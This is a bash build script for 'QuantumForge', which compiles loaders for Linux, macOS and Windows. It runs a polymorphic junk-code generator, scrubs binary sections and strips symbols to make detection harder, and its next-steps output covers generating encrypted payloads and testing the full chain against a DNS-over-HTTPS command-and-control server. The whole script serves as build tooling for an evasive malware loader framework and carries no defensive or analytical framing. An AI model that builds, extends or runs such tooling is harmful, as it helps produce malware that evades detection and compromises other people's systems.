#!/bin/bash

set -e

SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
cd "$SCRIPT_DIR"

PLATFORM="$(uname -s)"
BUILD_DIR="$SCRIPT_DIR/build"
TESTS_DIR="$SCRIPT_DIR/tests"
STATIC_BUILD=0

if [ "$1" == "--static" ]; then
    STATIC_BUILD=1
    echo "[*] Static linking enabled"
fi

echo "========================================"
echo "QuantumForge Unified Build Script"
echo "========================================"
echo ""
echo "[*] Platform: $PLATFORM"
echo "[*] Build directory: $BUILD_DIR"
echo "[*] Static build: $STATIC_BUILD"
echo ""

mkdir -p "$BUILD_DIR"

LINUX_BUILD=0
MAC_BUILD=0
WIN_BUILD=0

case "$PLATFORM" in
    Linux*)
        echo "[*] Linux platform detected"
        LINUX_BUILD=1
        ;;
    Darwin*)
        echo "[*] macOS platform detected"
        MAC_BUILD=1
        ;;
    MINGW*|MSYS*|CYGWIN*)
        echo "[*] Windows (MinGW/MSYS) platform detected"
        WIN_BUILD=1
        ;;
    *)
        echo "[!] Unknown platform: $PLATFORM"
        echo "[*] Attempting Linux build as fallback"
        LINUX_BUILD=1
        ;;
esac

echo ""

generate_junk() {
    if [ -f "$SCRIPT_DIR/generate_junk.py" ]; then
        echo "[*] Generating polymorphic junk code..."
        python3 "$SCRIPT_DIR/generate_junk.py"
    else
        echo "[!] generate_junk.py not found - using default junk.h"
    fi
}

echo "========================================"
echo "Step 1: Generate Build Artifacts"
echo "========================================"
generate_junk
echo ""

if [ $LINUX_BUILD -eq 1 ]; then
    echo "========================================"
    echo "Step 2: Building Linux Loader"
    echo "========================================"
    
    echo "[*] Compiling quantumserver (Linux ELF/SO loader)..."
    
    LINK_FLAGS="-lcrypto -lssl -lcurl -ldl"
    if [ $STATIC_BUILD -eq 1 ]; then
        echo "[*] Using static linking (musl-gcc if available)"
        LINK_FLAGS="-static -lcrypto -lssl -lcurl -ldl -lpthread -lz"
        if command -v musl-gcc &> /dev/null; then
            CC="musl-gcc"
        else
            CC="gcc"
        fi
    else
        CC="gcc"
    fi
    
    $CC -o "$BUILD_DIR/quantumserver" quantumserver.c \
        $LINK_FLAGS \
        -D_GNU_SOURCE \
        -O3 -march=native -flto \
        -fPIC -fPIE -pie \
        -fstack-protector-strong \
        -fvisibility=hidden \
        -D_FORTIFY_SOURCE=2 \
        -Wl,-z,relro,-z,now,-z,noexecstack \
        -Wall -Wextra -Werror=format-security \
        2>&1 | head -20 || {
        echo "[!] Compilation with full hardening failed, trying reduced flags..."
        $CC -o "$BUILD_DIR/quantumserver" quantumserver.c \
            $LINK_FLAGS \
            -D_GNU_SOURCE \
            -O2 -fPIC -fstack-protector-strong
    }
    
    if [ -f "$BUILD_DIR/quantumserver" ]; then
        echo "[+] quantumserver compiled successfully"
        
        if [ -f "$SCRIPT_DIR/scrub_sections.py" ]; then
            echo "[*] Scrubbing binary sections..."
            python3 "$SCRIPT_DIR/scrub_sections.py" "$BUILD_DIR/quantumserver"
        fi
        
        strip "$BUILD_DIR/quantumserver" 2>/dev/null || echo "[*] strip not available"
        
        SIZE=$(stat -f%z "$BUILD_DIR/quantumserver" 2>/dev/null || stat -c%s "$BUILD_DIR/quantumserver" 2>/dev/null)
        echo "[*] Binary size: $SIZE bytes"
    else
        echo "[!] Failed to compile quantumserver"
    fi
    
    echo ""
fi

if [ $MAC_BUILD -eq 1 ]; then
    echo "========================================"
    echo "Step 3: Building macOS Loader"
    echo "========================================"
    
    echo "[*] Compiling quantum_loader_mac (Mach-O loader)..."
    clang -o "$BUILD_DIR/quantum_loader_mac" quantum_loader_mac.c \
        -framework Security \
        -framework Foundation \
        -lcrypto \
        -lcurl \
        -O2 \
        -fvisibility=hidden \
        -Wno-deprecated-declarations \
        2>&1 | head -20 || {
        echo "[!] Compilation with optimizations failed, trying without..."
        clang -o "$BUILD_DIR/quantum_loader_mac" quantum_loader_mac.c \
            -framework Security \
            -framework Foundation \
            -lcrypto \
            -lcurl
    }
    
    if [ -f "$BUILD_DIR/quantum_loader_mac" ]; then
        echo "[+] quantum_loader_mac compiled successfully"
        
        strip "$BUILD_DIR/quantum_loader_mac" 2>/dev/null || echo "[*] strip not available"
        
        SIZE=$(stat -f%z "$BUILD_DIR/quantum_loader_mac" 2>/dev/null)
        echo "[*] Binary size: $SIZE bytes"
    else
        echo "[!] Failed to compile quantum_loader_mac"
    fi
    
    echo ""
fi

if [ $WIN_BUILD -eq 1 ]; then
    echo "========================================"
    echo "Step 4: Building Windows Loader"
    echo "========================================"
    
    if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        echo "[*] Cross-compiling quantum_loader_win.exe (Windows DLL loader)..."
        x86_64-w64-mingw32-gcc -o "$BUILD_DIR/quantum_loader_win.exe" quantum_loader_win.c \
            -lbcrypt -lkernel32 -ladvapi32 \
            -O2 \
            2>&1 | head -20
        
        if [ -f "$BUILD_DIR/quantum_loader_win.exe" ]; then
            echo "[+] quantum_loader_win.exe compiled successfully"
            
            SIZE=$(stat -c%s "$BUILD_DIR/quantum_loader_win.exe" 2>/dev/null)
            echo "[*] Binary size: $SIZE bytes"
        else
            echo "[!] Failed to compile quantum_loader_win.exe"
        fi
    else
        echo "[!] MinGW cross-compiler not found (x86_64-w64-mingw32-gcc)"
        echo "[!] Install with: sudo apt-get install mingw-w64"
        echo "[!] Skipping Windows build"
    fi
    
    echo ""
fi

echo "========================================"
echo "Build Summary"
echo "========================================"
echo ""

if [ -f "$BUILD_DIR/quantumserver" ]; then
    echo "[+] Linux loader: $BUILD_DIR/quantumserver"
fi

if [ -f "$BUILD_DIR/quantum_loader_mac" ]; then
    echo "[+] macOS loader: $BUILD_DIR/quantum_loader_mac"
fi

if [ -f "$BUILD_DIR/quantum_loader_win.exe" ]; then
    echo "[+] Windows loader: $BUILD_DIR/quantum_loader_win.exe"
fi

echo ""
echo "[*] Build artifacts saved to: $BUILD_DIR"
echo ""

TOTAL_BUILT=$(ls -1 "$BUILD_DIR"/ 2>/dev/null | wc -l)
echo "[*] Total binaries built: $TOTAL_BUILT"

echo ""
echo "========================================"
echo "Next Steps"
echo "========================================"
echo ""
echo "1. Test loaders:"
echo "   - Linux:   cd tests && ./test_loader_linux.sh"
echo "   - macOS:   cd tests && ./test_loader_mac.sh"
echo "   - Windows: cd tests && pwsh ./test_loader_win.ps1"
echo ""
echo "2. Generate encrypted payloads:"
echo "   - Linux:   ./quantum_forge.sh <payload>"
echo "   - macOS:   ./quantum_forge_mac.sh <payload>"
echo "   - Windows: pwsh ./quantum_forge_win.ps1 -PayloadFile <payload>"
echo ""
echo "3. Test full chain:"
echo "   - Start DoH C2: cd tests && python3 test_doh_server.py"
echo "   - Run loader with payload"
echo ""
echo "[+] Build completed successfully"
